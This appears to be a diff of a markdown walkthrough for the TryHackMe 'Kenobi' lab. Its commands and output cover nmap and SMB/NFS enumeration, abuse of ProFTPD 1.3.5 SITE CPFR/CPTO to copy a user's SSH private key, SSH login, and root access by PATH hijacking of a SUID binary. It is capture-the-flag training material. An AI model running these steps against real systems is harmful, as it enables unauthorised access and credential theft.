@@ -19,6 +19,7 @@ Room Link: [https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi
 - Running nmap gives
 
 ```bash
+
 nmap 10.10.60.186
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-28 14:09 IST
 Nmap scan report for 10.10.60.186
@@ -36,12 +37,14 @@ PORT     STATE    SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
 ```
+
 - Question "Scan the machine with nmap, how many ports are open?" Answer "7"
 ## Enumerating Samba for shares 
 
 - Now we can scan it with given nmap commands.
 
 ```bash
+
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.104.199
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-28 17:37 IST
 Nmap scan report for 10.10.104.199
@@ -82,10 +85,12 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 28.24 seconds
 
 ```
+
 - Question `Using the nmap command above, how many shares have been found?` Answer `3`
 - Connected to smb as `anonymous` user using given command `smbclient //10.10.56.134/anonymous` to read files
 
 ```bash
+
 smbclient //10.10.56.134/anonymous
 Password for [WORKGROUP\root]:
 Try "help" to get a list of possible commands.
@@ -96,20 +101,24 @@ smb: \> ls
 
 		9204224 blocks of size 1024. 6877096 blocks available
 ```
+
 - Question `Once you're connected, list the files on the share. What is the file can you see?` Answer `log.txt`
 - Then used given command to download files,
 
 ```bash
+
 smbget -R smb://10.10.56.134/anonymous
 Password for [root] connecting to //10.10.56.134/anonymous: 
 Using workgroup WORKGROUP, user root
 smb://10.10.56.134/anonymous/log.txt                                                                        
 Downloaded 11.95kB in 6 seconds
 ```
+
 - Question `What port is FTP running on?` Answer `21` Got it from `log.txt`
 - As given nmap scan command with script to scan port 111
 
 ```bash
+
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.56.134
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-28 23:36 IST
 Nmap scan report for 10.10.56.134
@@ -139,6 +148,7 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
 ```
+
 - Question `What mount can we see?` Answer `/var`
 
 ## Gain initial access with ProFtpd
@@ -146,12 +156,15 @@ Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
 - Question `What is the version?` (FTP) Answer `1.3.5`
 
 ```bash
+
 nc 10.10.245.171 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
 ```
+
 - Question `How many exploits are there for the ProFTPd running?` Answer `4`
 
 ```bash
+
 searchsploit proftp 1.3.5
 [i] Found (#2): /opt/exploit-database/files_exploits.csv
 [i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" which has "package_array: exploitdb" to point too: path_array+=("/opt/exploit-database")
@@ -169,9 +182,11 @@ ProFTPd 1.3.5 - File Copy                                                 | linu
 -------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
 - Copied `id_rsa` file according to given instruction
 
 ```bash
+
 nc 10.10.245.171 21
 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.245.171]
 SITE CPFR /home/kenobi/.ssh/id_rsa
@@ -179,9 +194,11 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
+
 - Mount NFS as instructed
 
 ```bash
+
 root@system:/tmp# mkdir /mnt/kenobiNFS
 root@system:/tmp# mount 10.10.245.171:/var /mnt/kenobiNFS
 root@system:/tmp# ls -la /mnt/kenobiNFS
@@ -204,9 +221,11 @@ drwxrwxrwt  6 root root  4096 Feb 29 10:00 tmp
 drwxr-xr-x  3 root root  4096 Sep  4  2019 www
 
 ```
+
 - Copy id_rsa to local system and connect to the server using ssh as instructed
 
 ```bash
+
 root@system:/tmp# cp /mnt/kenobiNFS/tmp/id_rsa .
 root@system:/tmp# chmod 600 id_rsa 
 root@system:/tmp# ssh -i id_rsa kenobi@10.10.245.171
@@ -231,12 +250,14 @@ See "man sudo_root" for details.
 
 kenobi@kenobi:~$ 
 ```
+
 - Question `What is Kenobi's user flag (/home/kenobi/user.txt)?` Answer `********************************` 32 alphanumeric characters. Get using `cat /home/kenobi/user.txt`
 ## Privilege Escalation with Path Variable Manipulation 
 
 - Question `What file looks particularly out of the ordinary?` Answer `/usr/bin/menu`
 
 ```bash
+
 kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /sbin/mount.nfs
 /usr/lib/policykit-1/polkit-agent-helper-1
@@ -263,9 +284,11 @@ kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
 /bin/su
 /bin/ping6
 ```
+
 - Question `Run the binary, how many options appear?` Answer `3`
 
 ```bash
+
 kenobi@kenobi:~$ /usr/bin/menu
 
 ***************************************
@@ -275,19 +298,23 @@ kenobi@kenobi:~$ /usr/bin/menu
 ** Enter your choice :
 
 ```
+
 - Now time to do reverse. We are going to run simple command `strings /usr/bin/menu`. (As instructed)
 Result shows:
 
 ```bash
+
 ** Enter your choice :
 curl -I localhost
 uname -r
 ifconfig
 ```
+
 - So we can assume choosing first option run first command `curl -I localhost` (As instructed).So we can change it to exploit. 
 - We can simply follow instruction to create file named curl with executable permission and add the file loacation to our path. Then simply running menu and selecting first option will do the rest as it run the curl we created, we will get root shell.
 
 ```bash
+
 kenobi@kenobi:~$ echo "/bin/sh" >curl
 kenobi@kenobi:~$ chmod 777 curl
 kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
@@ -304,6 +331,7 @@ uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(di
 # 
 
 ```
+
 - Question `What is the root flag (/root/root.txt)?` Answer `********************************` 32 alphanumeric chars. Command used `cat /root/root.txt`
    
 Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
